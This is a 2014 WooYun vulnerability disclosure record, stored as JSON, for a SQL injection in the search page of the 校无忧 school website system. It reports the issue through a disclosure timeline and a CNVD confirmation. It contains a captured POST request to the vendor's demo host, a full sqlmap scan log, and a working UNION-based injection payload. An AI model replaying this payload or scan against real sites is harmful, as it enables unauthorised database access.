{"id": 53565, "wybug_id": "wooyun-2014-067178", "wybug_title": "校无忧某系统POST注入", "wybug_corp": "校无忧", "wybug_author": "乐乐、", "wybug_date": "2014-07-04 17:59", "wybug_open_date": "2014-10-02 18:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向公众公开  简要描述： 你提交的通用型漏洞X漏洞获得了X元乌云奖金。 详细说明：  校无忧学校网站系统 v2.2 最新版  PS：我百度了 只有2.1 和1.x的有漏洞 2.2的没有官网啊：http://www.xiao5u.com/官方演示站：http://www.xiao5u.com/Demo/School/search.asp在搜索框有SQL注入    变量：keyword=\nPOST /Demo/School/search.asp HTTP/1.1Host: www.xiao5u.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.xiao5u.com/Demo/School/search.aspCookie: CNZZDATA585346=cnzz_eid%3D1533443457-1403577305-http%253A%252F%252Fwww.baidu.com%252F%26ntime%3D1404356337; Hm_lvt_27349b2ace33b7a6f44e3f892d03b3b0=1403577070; ASPSESSIONIDSQRCBBAS=CIHFGMCCJGEONLLAEDADCFFGConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 49keyword=abc&image.x=11&image.y=9\n\n[root@Hacker~]# Sqlmap -r 1.txt    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:56:09[10:56:09] [INFO] parsing HTTP request from '1.txt'[10:56:10] [INFO] testing connection to the target URL[10:56:10] [INFO] testing if the target URL is stable. This can take a couple of seconds[10:56:11] [INFO] target URL is stable[10:56:11] [INFO] testing if POST parameter 'keyword' is dynamic[10:56:12] [WARNING] POST parameter 'keyword' does not appear dynamic[10:56:12] [INFO] heuristics detected web page charset 'GB2312'[10:56:12] [INFO] heuristic (basic) test shows that POST parameter 'keyword' might be injectable (possible DBMS: 'Microsoft Access')[10:56:12] [INFO] testing for SQL injection on POST parameter 'keyword'heuristic (parsing) test showed that the back-end DBMS could be 'Microsoft Access'. Do you want to skip test payloads specific for other DBMSes? [Y/n] ydo you want to include all tests for 'Microsoft Access' extending provided level (1) and risk (1)? [Y/n] y[10:56:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:56:15] [WARNING] reflective value(s) found and filtering out[10:56:18] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'[10:56:19] [INFO] testing 'Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses'[10:56:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[10:56:27] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test[10:56:28] [INFO] target URL appears to have 12 columns in query[10:56:29] [INFO] POST parameter 'keyword' is 'Generic UNION query (NULL) - 1 to 10 columns' injectablePOST parameter 'keyword' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[10:56:31] [INFO] testing if POST parameter 'image.x' is dynamic[10:56:31] [WARNING] POST parameter 'image.x' does not appear dynamic[10:56:31] [WARNING] heuristic (basic) test shows that POST parameter 'image.x'might not be injectable[10:56:31] [INFO] testing for SQL injection on POST parameter 'image.x'[10:56:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:56:35] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'[10:56:36] [INFO] testing 'Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses'[10:56:36] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[10:56:36] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'[10:56:36] [WARNING] applying generic concatenation with double pipes ('||')injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] y[10:56:52] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. --dbms=mysql)[10:57:20] [WARNING] POST parameter 'image.x' is not injectable[10:57:20] [INFO] testing if POST parameter 'image.y' is dynamic[10:57:20] [WARNING] POST parameter 'image.y' does not appear dynamic[10:57:20] [WARNING] heuristic (basic) test shows that POST parameter 'image.y'might not be injectable[10:57:20] [INFO] testing for SQL injection on POST parameter 'image.y'[10:57:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:57:24] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'[10:57:24] [INFO] testing 'Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses'[10:57:25] [INFO] testing 'Generic UNION query (82) - 1 to 10 columns'[10:57:56] [WARNING] POST parameter 'image.y' is not injectablesqlmap identified the following injection points with a total of 374 HTTP(s) requests:---Place: POSTParameter: keyword    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: keyword=abc' UNION ALL SELECT NULL,CHR(113)&CHR(106)&CHR(115)&CHR(97)&CHR(113)&CHR(69)&CHR(109)&CHR(113)&CHR(110)&CHR(108)&CHR(69)&CHR(84)&CHR(116)&CHR(103)&CHR(76)&CHR(113)&CHR(122)&CHR(99)&CHR(108)&CHR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM MSysAccessObjects%16&image.x=11&image.y=9---[10:57:56] [INFO] testing MySQL[10:57:56] [WARNING] the back-end DBMS is not MySQL[10:57:56] [INFO] testing Oracle[10:57:56] [WARNING] the back-end DBMS is not Oracle[10:57:56] [INFO] testing PostgreSQL[10:57:56] [WARNING] the back-end DBMS is not PostgreSQL[10:57:56] [INFO] testing Microsoft SQL Server[10:57:57] [WARNING] the back-end DBMS is not Microsoft SQL Server[10:57:57] [INFO] testing SQLite[10:57:57] [WARNING] the back-end DBMS is not SQLite[10:57:57] [INFO] testing Microsoft Access[10:57:57] [INFO] confirming Microsoft Access[10:57:57] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft Access[10:57:57] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 23 times[10:57:57] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[10:57:57] [INFO] fetched data logged to text files under 'E:\\SQL?~1\\SQLMAP~1.4\\Bin\\output\\www.xiao5u.com'[*] shutting down at 10:57:57[root@Hacker~]# Sqlmap -r 1.txt\n\n\n   漏洞证明：  \n\n   修复方案：  过滤    版权声明：转载请注明来源 乐乐、@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-07-09 14:32 厂商回复： CNVD确认并复现所述实例情况，由CNVD通过以往建立的处置联系渠道再次向生产厂商通报。rank 15 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}